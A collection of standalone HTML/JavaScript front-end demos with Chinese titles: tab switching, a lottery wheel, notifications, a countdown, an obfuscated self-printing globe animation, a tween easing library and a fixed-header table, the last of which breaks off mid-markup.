<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	<title>ajax保持状态多标签切换</title>
	<style type="text/css">
		body
		{
			margin: 0 10px;
			padding: 0px;
			font-size: 14px;
		}
		.hide
		{
			display: none;
		}
		.tab_bar
		{
			height: 50px;
			padding: 0;
			border-bottom: 1px solid #A4A4A4;
		}
		.tab_bar ul
		{
			margin-top: 0px;
			margin-left: 50px;
		}
		.tab_bar ul li
		{
			display: inline;
		}
		.tab_bar ul li a
		{
			height: 20px;
			text-decoration: none;
			color: #333;
			margin: 9px 10px 10px 0;
			padding: 10px;
			display: inline-block;
			background-color: #DBECFE;
			border: 1px solid #A4A4A4;
		}
		.tab_bar ul li a:hover, .tab_bar ul li a.here
		{
			background-color: #fff;
			border-bottom: 1px solid #fff;
		}
	</style>
	<script type="text/javascript">
		function $(id) {
			return document.getElementById(id);
		}
		function createFunction(obj, strFunc) {
			var args = [];
			if (!obj) obj = window;
			for (var i = 2; i < arguments.length; i++) args.push(arguments[i]);
			return function () {
				obj[strFunc].apply(obj, args);
			}
		}
		function addEvent(obj, type, fn) {
			if (obj.attachEvent) {
				obj.attachEvent('on' + type, fn);
			} else
				obj.addEventListener(type, fn, false);
		}
		function monitHashChange(hashChangeFire) {
			var hash = window.location.hash.substring(1);
			if (('onhashchange' in window)
				&& ((typeof document.documentMode === 'undefined')
				|| document.documentMode == 8)) {
				window.onhashchange = function () {
					hashChangeFire(window.location.hash.substring(1));
				};
			} else {
				setInterval(function () {
					var ischanged = hash != window.location.hash.substring(1);
					if (ischanged) {
						hash = window.location.hash.substring(1);
						hashChangeFire(hash);
					}
				}, 150);
			}
		}
		function show_panel(link) {
			link = typeof (link) == "string" ? link : link.id.replace("link_", "");
			window.location.hash = link;
			if (link.length == 0)
				link = "install_sql";
			var links = ["install_sql", "basic_setting", "mail_setting", "alipay_setting"];
			for (var i = 0; i < links.length; i++) {
				var n = links[i];
				if (n == link) {
					$("link_" + n).setAttribute("class", "here");
					$("div_" + n).style.display = "block";
				}
				else {
					$("link_" + n).removeAttribute("class");
					$("div_" + n).style.display = "none";
				}
			}
		}
		var link = (!window.location.hash) ? "install_sql" : window.location.hash.substring(1);
		addEvent(window, "load", createFunction(null, "show_panel", link));
		addEvent(window, "load", createFunction(null, "monitHashChange", show_panel));

	</script>
</head>
<body>
	<div class="tab_bar">
		<ul>
			<li><a href="javascript:;" onclick="show_panel(this)" id="link_install_sql" class="here">
				1、安装数据库</a></li>
			<li><a href="javascript:;" onclick="show_panel(this)" id="link_basic_setting">2、设置基本配置</a></li>
			<li><a href="javascript:;" onclick="show_panel(this)" id="link_mail_setting">3、邮件相关设置</a></li>
			<li><a href="javascript:;" onclick="show_panel(this)" id="link_alipay_setting">4、支付宝配置</a></li>
		</ul>
	</div>
	<div id="div_install_sql">
		<h2>
			1、安装数据库</h2>
	</div>
	<div id="div_basic_setting" class="hide">
		<h2>
			2、设置基本配置</h2>
	</div>
	<div id="div_mail_setting" class="hide">
		<h2>
			3、邮件相关设置</h2>
	</div>
	<div id="div_alipay_setting" class="hide">
		<h2>
			4、支付宝配置</h2>
	</div>
</body>
</html>
#T=抽奖转盘
<!DOCTYPE html>
<html>
<head>
	<title>抽奖</title>
	<style type="text/css">
		#container{width: 400px;height: 400px;position: relative;margin: 0 auto;}
		#demo{position: absolute;filter: progid:DXImageTransform.Microsoft.Matrix(sizingmethod="auto expand");}
	</style>
</head>
<body style="height: 1000px;">
	<div id="container">
		<div id="demo">
			<img alt="" src="http://images.cnblogs.com/cnblogs_com/kuikui/354173/r_a.png" width="400" height="400" />
		</div>
	</div>
	<input id="test" type="button" value="抽奖" />
	<input id="restart" style="display: none;" type="button" value="再抽一次" />
	<div id="msg">
	</div>
	<script type="text/javascript">
		var m$ = function (id) { return document.getElementById(id); }
		var ua = navigator.userAgent;
		var isIE = /msie/i.test(ua) && !window.opera;

		var i = 1, sinDeg = 0, cosDeg = 0, timer = null;
		var mRotate = function () {
			var rotate = function (target, msg) {
				target = m$(target);
				var orginW = target.clientWidth, orginH = target.clientHeight;
				clearInterval(timer);
				function run(angle) {
					if (isIE) {
						cosDeg = Math.cos(angle * Math.PI / 180);
						sinDeg = Math.sin(angle * Math.PI / 180);
						with (target.filters.item(0)) {
							M11 = M22 = cosDeg; M12 = -(M21 = sinDeg);
						}
						target.style.top = (orginH - target.offsetHeight) / 2 + "px";
						target.style.left = (orginW - target.offsetWidth) / 2 + "px";
					} else if (target.style.MozTransform !== undefined) {
						target.style.MozTransform = "rotate(" + angle + "deg)";
					} else if (target.style.OTransform !== undefined) {
						target.style.OTransform = "rotate(" + angle + "deg)";
					} else if (target.style.webkitTransform !== undefined) {
						target.style.webkitTransform = "rotate(" + angle + "deg)";
					} else {
						target.style.transform = "rotate(" + angle + "deg)";
					}
				}

				var tmp = -900;
				var m = -parseInt(Math.random() * 360);
				timer = setInterval(function () {
					if (i > 3000) {
						tmp = parseInt(tmp * 0.99);
						if (tmp > m) {
							tmp = m;
							clearInterval(timer);
							msg(m);
						}
						run(tmp);
					}
					else if (i > 1000) {
						i = i + 45;
						run(i);
					}
					else {
						i = parseInt((i + 1) * 1.01);
						run(i);
					}
				}, 50);
			}
			return { rotate: rotate }
		} ();

		function showMsg() {
			mRotate.rotate("demo", function msg(m) {
				if (m > -90 && m < -30) {
					m$("msg").innerHTML += "22222222";
				}
				else if (m > -150 && m < -90) {
					m$("msg").innerHTML += "333333333";
				}
				else if (m > -210 && m < -150) {
					m$("msg").innerHTML += "444444";
				}
				else if (m > -270 && m < -210) {
					m$("msg").innerHTML += "5555555";
				}
				else if (m > -330 && m < -270) {
					m$("msg").innerHTML += "6666666";
				} else {
					m$("msg").innerHTML += "111111111";
				}
				m$('restart').style.display = "block";
			});
		}

		window.onload = function () {
			m$('test').onclick = function () {
				m$('test').style.display = "none";
				showMsg();
			}

			m$('restart').onclick = function () {
				m$('restart').style.display = "none";

				if (isIE) {
					m$("demo").style.top = "0px";
					m$("demo").style.left = "0px";
				} else if (m$("demo").style.MozTransform !== undefined) {
					m$("demo").style.MozTransform = 'rotate(0deg)';
				} else if (m$("demo").style.OTransform !== undefined) {
					m$("demo").style.OTransform = 'rotate(0deg)';

				} else if (m$("demo").style.webkitTransform !== undefined) {
					m$("demo").style.webkitTransform = 'rotate(0deg)';
				} else {
					m$("demo").style.transform = 'rotate(0deg)';
				}

				m$('test').style.display = "block";
				i = 0;
			}
		}
	</script>
</body>
</html>

#T=弹出消息 HTML5 Chrome 
<!DOCTYPE HTML>
<html>
<head
<meta charset="gbk">  
<title>Creating OS notifications in HTML5</title>
</head>
<body>
<h1>爱玩 <a title="爱玩C" href="http://www.iwanc.com" target="_blank">http://www.iwanc.com</a></h1>
<input type="button" value="验证授权" onclick="init();" />
<input type="button" value="弹出消息" onclick="notify();" />
<script type="text/javascript">
	const miao = 5;
	function init() {
		if (window.webkitNotifications) {
			window.webkitNotifications.requestPermission();
		}
	}
	function notify() {
		var icon = "logo.png";
		var title = "Hello World";
		var body =  "You Are My World (5秒后自动关闭)";
		if (window.webkitNotifications) {
			if (window.webkitNotifications.checkPermission() == 0) {
				var popup = window.webkitNotifications.createNotification(icon, title, body);
				popup.ondisplay = function(event) {
					setTimeout(function() {
						event.currentTarget.cancel();
					}, miao * 1000);
				}
				popup.show();
				popup.show();
			} else {
				window.webkitNotifications.requestPermission();
				return;
			}
		}
	}
</script>
</body>
</html>
#T=倒计时效果Jquery实现
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">  
<html xmlns="http://www.w3.org/1999/xhtml">  
<head>  
<meta http-equiv="Content-Type" content="text/html; charset=gbk" />  
<title>Jquery实现倒计时效果</title>  
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
  
<script type="text/javascript">  
 var SysSecond;  
 var InterValObj;  
   
 $(document).ready(function() {  
  SysSecond = parseInt($("#remainSeconds").html()); //这里获取倒计时的起始时间  
  InterValObj = window.setInterval(SetRemainTime, 1000); //间隔函数，1秒执行  
 });  
  
 //将时间减去1秒，计算天、时、分、秒  
 function SetRemainTime() {  
  if (SysSecond > 0) {  
   SysSecond = SysSecond - 1;  
   var second = Math.floor(SysSecond % 60);             // 计算秒      
   var minite = Math.floor((SysSecond / 60) % 60);      //计算分  
   var hour = Math.floor((SysSecond / 3600) % 24);      //计算小时  
   var day = Math.floor((SysSecond / 3600) / 24);        //计算天  
  
   $("#remainTime").html(day + "天" + hour + "小时" + minite + "分" + second + "秒");  
  } else {//剩余时间小于或等于0的时候，就停止间隔函数  
   window.clearInterval(InterValObj);  
   //这里可以添加倒计时时间为0后需要执行的事件  
  }  
 }  
</script>  
  
</head>  
  
<body>  
      
<div id="remainSeconds" style="display:none">360000</div>  
<div id="remainTime" style="font-size:20px;font-weight:800;color:#FF9900"></div>  
  
</body>  
</html>
#T=地球自转
<!doctype html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="Generator" content="EditPlus?,Microshaoft">
	<meta name="Author" content="EditPlus?,Microshaoft">
	<meta name="Keywords" content="EditPlus?,Microshaoft">
	<meta name="Description" content="EditPlus?,Microshaoft">
	<title>Document</title>
</head>
<body>
<script type="text/javascript">
<!--
	z='p="<"+"pre>"/* ,.oq#+     ,._, */;for(y in n="zw24l6k\
4e3t4jnt4qj24xh2 x/* =<,m#F    A W###q. */42kty24wrt413n243n\
9h243pdxt41csb yz/* #K       q##H######Am */43iyb6k43pk7243nm\
r24".split(4)){/* dP      cpq#q##########b, */for(a in t=pars\
eInt(n[y],36)+/*         p##@###YG=[#######y */(e=x=r=[]))for\
(r=!r,i=0;t[a/*         d#qg `*PWo##q#######D */]>i;i+=.05)wi\
th(Math)x-= /*        aem1k.com Q###KWR#### W[ */.05,0>cos(o=\
new Date/1e3/*      .Q#########Md#.###OP  A@ , */+x/PI)&&(e[~\
~(32*sin(o)*/* ,    (W#####Xx######.P     T % */sin(.5+y/7))\
+60] =-~ r);/* #y    `TqW####P###BP           */for(x=0;122>\
x;)p+="   *#"/* b.        OQ####x#K           */[e[x++]+e[x++\
]]||(S=("eval"/* l         `X#####D  ,       */+"(z=\'"+z.spl\
it(B = "\\\\")./*           G####B" #       */join(B+B).split\
(Q="\'").join(B+Q/*          VQBP`        */)+Q+")//m1k")[x/2\
+61*y-1]).fontcolor/*         TP         */(/\\w/.test(S)&&"#\
03B");document.body.innerHTML=p+=B+"\\n"}setTimeout(z)'

// p is the output string
p = "<" + "pre>";

// split string in to base-36 numbers, deliniated by `4`
for (y in n = "zw24l6k4e3t4jnt4qj24xh2 x42kty24wrt413n243n9h243pdxt41csbyz43iyb6k43pk7243nmr24".split(4)) {
    
    // parse base-36 numbers; set x, e, and r to new array each loop
    for (a in t = parseInt(n[y], 36) + (e = x = r = []))
        
        // iterate over the properties of each Number (unsure what purpose this serves)
        for (r = !r, i = 0; t[a] > i; i += .05)
            
          // !!! this seems to be where the magic happens; e, x, and r are populated !!!
          with(Math) x -= .05, 0 > cos(o = new Date / 1e3 + x / PI) && (e[~~(32 * sin(o) * sin(.5 + y / 7)) + 60] = -~r);

    
    // let's build the output string
    for (x = 0; 122 > x;) {
        // decide whether to place a space, star, or hash mark by index value `[x++] + e[x++]`
        p += "   *#"[e[x++] + e[x++]] ||
            
            // if the index is out of bounds, the value is undefined and this code runs
            (S =
             // add "eval" wrapping to the output string
             ("eval" + "(z=\'" +
              z.split(B = "\\\\")
               .join(B + B)
               .split(Q = "\'")
               .join(B + Q) + Q + ")//m1k")
             // access index of string S
             [x / 2 + 61 * y - 1])
          // if this is a letter, add <font color="#03B"> to it 
          .fontcolor(/\\w/.test(S) && "#03B");
    }
    
    // finally, draw p
    document.body.innerHTML = p += B + "\\n";
}

// setTimeout is used like eval here
setTimeout(z);
//-->
</script>
</body>
</html>

#T=动画 Animation
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	<title></title>

	<script type="text/javascript">
		/*
		t:currentCount 当前执行第t次
		b:initPos 初始值
		c:targetPos - initPos 发生偏移的距离值
		d:count 一共执行d次
		效果：http://www.robertpenner.com/easing/easing_demo.html 
		JavaScript Tween算法及缓动效果 http://www.cnblogs.com/cloudgamer/archive/2009/01/06/tween.html
		*/
		var Tween = {
			Linear: function(initPos, targetPos, currentCount, count) {
				var b = initPos, c = targetPos - initPos, t = currentCount, d = count;
				return c * t / d + b;
			},
			Quad: {
				easeIn: function(initPos, targetPos, currentCount, count) {
					var b = initPos, c = targetPos - initPos, t = currentCount, d = count;
					return c * (t /= d) * t + b;
				},
				easeOut: function(initPos, targetPos, currentCount, count) {
					var b = initPos, c = targetPos - initPos, t = currentCount, d = count;
					return -c * (t /= d) * (t - 2) + b;
				},
				easeInOut: function(initPos, targetPos, currentCount, count) {
					var b = initPos, c = targetPos - initPos, t = currentCount, d = count;
					if ((t /= d / 2) < 1) return c / 2 * t * t + b;
					return -c / 2 * ((--t) * (t - 2) - 1) + b;
				}
			},
			Cubic: {
				easeIn: function(initPos, targetPos, currentCount, count) {
					var b = initPos, c = targetPos - initPos, t = currentCount, d = count;
					return c * (t /= d) * t * t + b;
				},
				easeOut: function(initPos, targetPos, currentCount, count) {
					var b = initPos, c = targetPos - initPos, t = currentCount, d = count;
					return c * ((t = t / d - 1) * t * t + 1) + b;
				},
				easeInOut: function(initPos, targetPos, currentCount, count) {
					var b = initPos, c = targetPos - initPos, t = currentCount, d = count;
					if ((t /= d / 2) < 1) return c / 2 * t * t * t + b;
					return c / 2 * ((t -= 2) * t * t + 2) + b;
				}
			},
			Quart: {
				easeIn: function(initPos, targetPos, currentCount, count) {
					var b = initPos, c = targetPos - initPos, t = currentCount, d = count;
					return c * (t /= d) * t * t * t + b;
				},
				easeOut: function(initPos, targetPos, currentCount, count) {
					var b = initPos, c = targetPos - initPos, t = currentCount, d = count;
					return -c * ((t = t / d - 1) * t * t * t - 1) + b;
				},
				easeInOut: function(initPos, targetPos, currentCount, count) {
					var b = initPos, c = targetPos - initPos, t = currentCount, d = count;
					if ((t /= d / 2) < 1) return c / 2 * t * t * t * t + b;
					return -c / 2 * ((t -= 2) * t * t * t - 2) + b;
				}
			},
			Quint: {
				easeIn: function(initPos, targetPos, currentCount, count) {
					var b = initPos, c = targetPos - initPos, t = currentCount, d = count;
					return c * (t /= d) * t * t * t * t + b;
				},
				easeOut: function(initPos, targetPos, currentCount, count) {
					var b = initPos, c = targetPos - initPos, t = currentCount, d = count;
					return c * ((t = t / d - 1) * t * t * t * t + 1) + b;
				},
				easeInOut: function(initPos, targetPos, currentCount, count) {
					var b = initPos, c = targetPos - initPos, t = currentCount, d = count;
					if ((t /= d / 2) < 1) return c / 2 * t * t * t * t * t + b;
					return c / 2 * ((t -= 2) * t * t * t * t + 2) + b;
				}
			},
			Sine: {
				easeIn: function(initPos, targetPos, currentCount, count) {
					var b = initPos, c = targetPos - initPos, t = currentCount, d = count;
					return -c * Math.cos(t / d * (Math.PI / 2)) + c + b;
				},
				easeOut: function(initPos, targetPos, currentCount, count) {
					var b = initPos, c = targetPos - initPos, t = currentCount, d = count;
					return c * Math.sin(t / d * (Math.PI / 2)) + b;
				},
				easeInOut: function(initPos, targetPos, currentCount, count) {
					var b = initPos, c = targetPos - initPos, t = currentCount, d = count;
					return -c / 2 * (Math.cos(Math.PI * t / d) - 1) + b;
				}
			},
			Expo: {
				easeIn: function(initPos, targetPos, currentCount, count) {
					var b = initPos, c = targetPos - initPos, t = currentCount, d = count;
					return (t == 0) ? b : c * Math.pow(2, 10 * (t / d - 1)) + b;
				},
				easeOut: function(initPos, targetPos, currentCount, count) {
					var b = initPos, c = targetPos - initPos, t = currentCount, d = count;
					return (t == d) ? b + c : c * (-Math.pow(2, -10 * t / d) + 1) + b;
				},
				easeInOut: function(initPos, targetPos, currentCount, count) {
					var b = initPos, c = targetPos - initPos, t = currentCount, d = count;
					if (t == 0) return b;
					if (t == d) return b + c;
					if ((t /= d / 2) < 1) return c / 2 * Math.pow(2, 10 * (t - 1)) + b;
					return c / 2 * (-Math.pow(2, -10 * --t) + 2) + b;
				}
			},
			Circ: {
				easeIn: function(initPos, targetPos, currentCount, count) {
					var b = initPos, c = targetPos - initPos, t = currentCount, d = count;
					return -c * (Math.sqrt(1 - (t /= d) * t) - 1) + b;
				},
				easeOut: function(initPos, targetPos, currentCount, count) {
					var b = initPos, c = targetPos - initPos, t = currentCount, d = count;
					return c * Math.sqrt(1 - (t = t / d - 1) * t) + b;
				},
				easeInOut: function(initPos, targetPos, currentCount, count) {
					var b = initPos, c = targetPos - initPos, t = currentCount, d = count;
					if ((t /= d / 2) < 1) return -c / 2 * (Math.sqrt(1 - t * t) - 1) + b;
					return c / 2 * (Math.sqrt(1 - (t -= 2) * t) + 1) + b;
				}
			},
			Elastic: {
				easeIn: function(initPos, targetPos, currentCount, count, a, p) {
					var b = initPos, c = targetPos - initPos, t = currentCount, d = count;
					if (t == 0) return b; if ((t /= d) == 1) return b + c; if (!p) p = d * .3;
					if (!a || a < Math.abs(c)) { a = c; var s = p / 4; }
					else var s = p / (2 * Math.PI) * Math.asin(c / a);
					return -(a * Math.pow(2, 10 * (t -= 1)) * Math.sin((t * d - s) * (2 * Math.PI) / p)) + b;
				},
				easeOut: function(initPos, targetPos, currentCount, count, a, p) {
					var b = initPos, c = targetPos - initPos, t = currentCount, d = count;
					if (t == 0) return b; if ((t /= d) == 1) return b + c; if (!p) p = d * .3;
					if (!a || a < Math.abs(c)) { a = c; var s = p / 4; }
					else var s = p / (2 * Math.PI) * Math.asin(c / a);
					return (a * Math.pow(2, -10 * t) * Math.sin((t * d - s) * (2 * Math.PI) / p) + c + b);
				},
				easeInOut: function(initPos, targetPos, currentCount, count, a, p) {
					var b = initPos, c = targetPos - initPos, t = currentCount, d = count;
					if (t == 0) return b; if ((t /= d / 2) == 2) return b + c; if (!p) p = d * (.3 * 1.5);
					if (!a || a < Math.abs(c)) { a = c; var s = p / 4; }
					else var s = p / (2 * Math.PI) * Math.asin(c / a);
					if (t < 1) return -.5 * (a * Math.pow(2, 10 * (t -= 1)) * Math.sin((t * d - s) * (2 * Math.PI) / p)) + b;
					return a * Math.pow(2, -10 * (t -= 1)) * Math.sin((t * d - s) * (2 * Math.PI) / p) * .5 + c + b;
				}
			},
			Back: {
				easeIn: function(initPos, targetPos, currentCount, count, s) {
					var b = initPos, c = targetPos - initPos, t = currentCount, d = count;
					if (s == undefined) s = 1.70158;
					return c * (t /= d) * t * ((s + 1) * t - s) + b;
				},
				easeOut: function(initPos, targetPos, currentCount, count, s) {
					var b = initPos, c = targetPos - initPos, t = currentCount, d = count;
					if (s == undefined) s = 1.70158;
					return c * ((t = t / d - 1) * t * ((s + 1) * t + s) + 1) + b;
				},
				easeInOut: function(initPos, targetPos, currentCount, count, s) {
					var b = initPos, c = targetPos - initPos, t = currentCount, d = count;
					if (s == undefined) s = 1.70158;
					if ((t /= d / 2) < 1) return c / 2 * (t * t * (((s *= (1.525)) + 1) * t - s)) + b;
					return c / 2 * ((t -= 2) * t * (((s *= (1.525)) + 1) * t + s) + 2) + b;
				}
			},
			Bounce: {
				easeIn: function(initPos, targetPos, currentCount, count) {
					var b = initPos, c = targetPos - initPos, t = currentCount, d = count;
					return c - Tween.Bounce.easeOut(d - t, 0, c, d) + b;
				},
				easeOut: function(initPos, targetPos, currentCount, count) {
					var b = initPos, c = targetPos - initPos, t = currentCount, d = count;
					if ((t /= d) < (1 / 2.75)) {
						return c * (7.5625 * t * t) + b;
					} else if (t < (2 / 2.75)) {
						return c * (7.5625 * (t -= (1.5 / 2.75)) * t + .75) + b;
					} else if (t < (2.5 / 2.75)) {
						return c * (7.5625 * (t -= (2.25 / 2.75)) * t + .9375) + b;
					} else {
						return c * (7.5625 * (t -= (2.625 / 2.75)) * t + .984375) + b;
					}
				},
				easeInOut: function(initPos, targetPos, currentCount, count) {
					var b = initPos, c = targetPos - initPos, t = currentCount, d = count;
					if (t < d / 2) return Tween.Bounce.easeIn(t * 2, 0, c, d) * .5 + b;
					else return Tween.Bounce.easeOut(t * 2 - d, 0, c, d) * .5 + c * .5 + b;
				}
			}
		}

		///------------------------------------------------------------------------------------------------------		
		Animation = {
			timer: 10,
			SetOpacity: function(obj, n) {
				if (document.all) {
					obj.filters.alpha.opacity = n;
				}
				else {
					obj.style.opacity = n / 100;
				}
			},
			fade: function(obj, target, count, Func) {
				obj = this.getItself(obj);
				var currentCount = 0;
				count = Math.abs(count) || 1;
				target = target < 0 ? 0 : (target > 100) ? 100 : target;
				var init = document.all ? obj.filters.alpha.opacity : window.getComputedStyle(obj, null).opacity * 100;
				Func = Func || Tween.Linear;
				var opr = this;
				var flag = setInterval(function() {
					if (currentCount > count) {
						clearInterval(flag);
					}
					else {
						currentCount++;
						var tmp = Func(init, target, currentCount, count);
						opr.SetOpacity(obj, tmp);
						//清除小数点的误差
						if (Math.abs(tmp - target) < 1) {
							opr.SetOpacity(obj, target);
						}
					}
				}
				, this.timer);
			},
			resize: function(obj, targetPos, count, Func) {
				obj = this.getItself(obj);
				var currentCount = 0;
				count = Math.abs(count) || 1;
				var initPos = { x: obj.offsetWidth, y: obj.offsetHeight }
				Func = Func || Tween.Linear;
				targetPos = { x: targetPos.x < 0 ? 0 : targetPos.x, y: targetPos.y < 0 ? 0 : targetPos.y }
				var flag = setInterval(function() {
					if (currentCount > count) {
						clearInterval(flag);
					}
					else {
						currentCount++;
						var tmpX = Func(initPos.x, targetPos.x, currentCount, count);
						var tmpY = Func(initPos.y, targetPos.y, currentCount, count);
						//width值不能小于0，但是算法返回值有可能出现负值
						try {
							obj.style.width = tmpX + "px";
							obj.style.height = tmpY + "px";
						}
						catch (e) {
						}
						//清除小数点的误差
						if (Math.abs(tmpX - targetPos.x) < 1) {
							obj.style.width = targetPos.x + "px";
						}
						if (Math.abs(tmpY - targetPos.y) < 1) {
							obj.style.height = targetPos.y + "px";
						}
					}
				}
				, this.timer);
			},
			move: function(obj, targetPos, count, Func) {
				obj = this.getItself(obj);
				var currentCount = 0;
				count = Math.abs(count) || 1;
				var elPos = this.getElementPos(obj);
				var initPos = { x: elPos.x, y: elPos.y }
				Func = Func || Tween.Linear;
				var flag = setInterval(function() {
					if (currentCount > count) {
						clearInterval(flag);
					}
					else {
						currentCount++;
						var tmpX = Func(initPos.x, targetPos.x, currentCount, count);
						var tmpY = Func(initPos.y, targetPos.y, currentCount, count);
						obj.style.left = tmpX + "px";
						obj.style.top = tmpY + "px";
						//清除小数点的误差
						if (Math.abs(tmpX - targetPos.x) < 1) {
							obj.style.left = targetPos.x + "px";
						}
						if (Math.abs(tmpY - targetPos.y) < 1) {
							obj.style.top = targetPos.y + "px";
						}
					}
				}
				, this.timer);
			},
			getElementPos: function(el) {
				el = this.getItself(el);
				var _x = 0, _y = 0;
				do {
					_x += el.offsetLeft;
					_y += el.offsetTop;
				} while (el = el.offsetParent);
				return { x: _x, y: _y };
			},
			getItself: function(id) {
				return "string" == typeof id ? document.getElementById(id) : id;
			}
		}
	</script>

	<style type="text/css">
		.div
		{
			position: absolute;
			border: solid 1px #849BCA;
			left: 50px;
			top: 100px;
			width: 160px;
			height: 130px;
			background-color: #DBE4ED;
			white-space: nowrap;
			overflow: hidden;
			opacity: 1; 
			filter: alpha(opacity=100);
		}
	</style>
</head>
<body>
	<input type="button" value="Move" onclick="Animation.move('divObj',{x:500,y:500},100,Tween.Quart.easeInOut);" />
	<input type="button" value="Resize" onclick="Animation.resize('divObj',{x:50,y:50},100,Tween.Cubic.easeIn);" />
	<input type="button" value="SetOpacity" onclick="Animation.fade('divObj',50,100);" />
	<input type="button" value="Move&Resize" onclick="Animation.resize('divObj',{x:300,y:200},100);Animation.move('divObj',{x:300,y:300},100);" />
	<input type="button" value="Move&Resize&SetOpacity" onclick="Animation.fade('divObj',50,100);Animation.resize('divObj',{x:300,y:200},100);Animation.move('divObj',{x:100,y:100},100);" />
	<input type="button" value="Reset" onclick="javascript:window.location.reload();" />
	<div id="divObj" class="div" style="">
		<div style="border: solid 1px green; width: 70px;">
			~_~ ----></div>
		<input type="text" value="input" style="width: 50px;" /><br />
		<input type="button" value="button" /><br />
		<img src="http://www.cnblogs.com/images/logo_small.gif" alt="" />
	</div>
</body>
</html>

#T=冻结 固定 header 列
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	<title> new document </title>
	<meta name="generator" content="editplus" />
	<meta name="author" content="" />
	<meta name="keywords" content="" />
	<meta name="description" content="" />
	<style type="text/css">
		.FixedHeaderColumnsTableDiv
		{
			overflow: auto;
			position: relative;
			border: 1px solid;
		}
		.FixedCell
		{
			position: relative;
			top: expression(this.offsetParent.scrollTop);
			left: expression(this.parentElement.offsetParent.scrollLeft);
			background-color: buttonface;
			border: 1px solid black;
			z-index: 1800;
		}
		
		.FixedHeaderRow1
		{
			position: relative;
			top: expression(this.offsetParent.scrollTop);
			background-color: buttonface;
			border: 0px solid black;
			z-index: 300;
		}
		.FixedHeaderRow2
		{
			position: relative;
			top: expression(this.offsetParent.scrollTop);
			background-color: buttonface;
			border: 0px solid black;
			z-index: 290;
		}
		.FixedDataColumn
		{
			position: relative; 
			left: expression(this.parentElement.offsetParent.parentElement.scrollLeft);
			background-color: buttonface;
			border: 1px solid black;
			z-index: 200;
		}
		table
		{
			border: 0px solid black;
			z-index: 1;
		}
		td
		{
			position: relative;
			border-right: 1px solid black;
			border-bottom: 1px solid black;
			z-index: 1;
		}
	</style>
</head>
<body>
	<div class="FixedHeaderColumnsTableDiv" style="width: 1000px;height: 600px">
		<table border="1" cellpadding="2" cellspacing="0" width="1200px">
			<tr class="FixedHeaderRow1">
				<td class="FixedCell" style="width: 80px" rowspan="2">
					header1
				</td>
				<td class="FixedCell" style="width: 80px">
					header2
				</td>
				<td class="FixedCell" style="width: 80px">
					header3
				</td>
				<td class="FixedCell" style="width: 80px">
					header4
				</td>
				<td style="width: 80px">
					header5
				</td>
				<td style="width: 80px">
					header6
				</td>
				<td style="width: 80px">
					header7
				</td>
				<td style="width: 80px">
					header8
				</td>
				<td style="width: 80px">
					header9
				</td>
				<td style="width: 80px">
					header10
				</td>
				<td style="width: 80px">
					header11
				</td>
				<td style="width: 80px">
					header12
				</td>
				<td style="width: 80px" rowspan="2">
					header13
				</td>
				<td style="width: 80px" rowspan="2">
					header14
				</td>
				<td style="width: 80px" rowspan="2">
					header15
				</td>
			</tr>
			<tr class="FixedHeaderRow2">
				<td class="FixedCell" style="width: 80px" align="center">
					<table>
						<tr>
							<td>
								<input type="button" id="" value="aa" />
							</td>
							<td>
								<input type="button" id="" value="aa" />
							</td>
						</tr>
					</table>
				</td>
				<td class="FixedCell" style="width: 80px" align="center">
					<input type="button" id="" value="aa" />
				</td>
				<td class="FixedCell" style="width: 80px">
					header16
				</td>
				<td class="FixedHeaderColumn1" style="width: 80px" colspan="8">
					header17
				</td>
			</tr>
			<tr>
				<td rowspan="2" class="FixedDataColumn">
					col1
				</td>
				<td rowspan="2" class="FixedDataColumn">
					col2
				</td>
				<td rowspan="2" class="FixedDataColumn">
					col3
				</td>
				<td class="FixedDataColumn">
					col4
				</td>
				<td>
					col5
				</td>
				<td>
					col6
				</td>
				<td>
					col7
				</td>
				<td>
					col8
				</td>
				<td>
					col9
				</td>
				<td>
					col10
				</td>
				<td>
					col11
				</td>
				<td>
					col12
				</td>
				<td rowspan="2">
					col13
				</td>
				<td rowspan="2">
					col14
				</td>
				<td rowspan="2">
					col15
				</td>
			</tr>
			<tr>
				<td class="FixedDataColumn">
					col16
				</td>
				<td style="word-wrap: word-break" colspan="8">
					<div style="overflow: auto;width: 1100px;height: 50px;border: 1px solid">
						col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达
					</div>
				</td>
			</tr>
			<tr>
				<td rowspan="2" class="FixedDataColumn">
					col1
				</td>
				<td rowspan="2" class="FixedDataColumn">
					col2
				</td>
				<td rowspan="2" class="FixedDataColumn">
					col3
				</td>
				<td class="FixedDataColumn">
					col4
				</td>
				<td>
					col5
				</td>
				<td>
					col6
				</td>
				<td>
					col7
				</td>
				<td>
					col8
				</td>
				<td>
					col9
				</td>
				<td>
					col10
				</td>
				<td>
					col11
				</td>
				<td>
					col12
				</td>
				<td rowspan="2">
					col13
				</td>
				<td rowspan="2">
					col14
				</td>
				<td rowspan="2">
					col15
				</td>
			</tr>
			<tr>
				<td class="FixedDataColumn">
					col16
				</td>
				<td style="word-wrap: word-break" colspan="8">
					<div style="overflow: auto;width: 1100px;height: 50px;border: 1px solid">
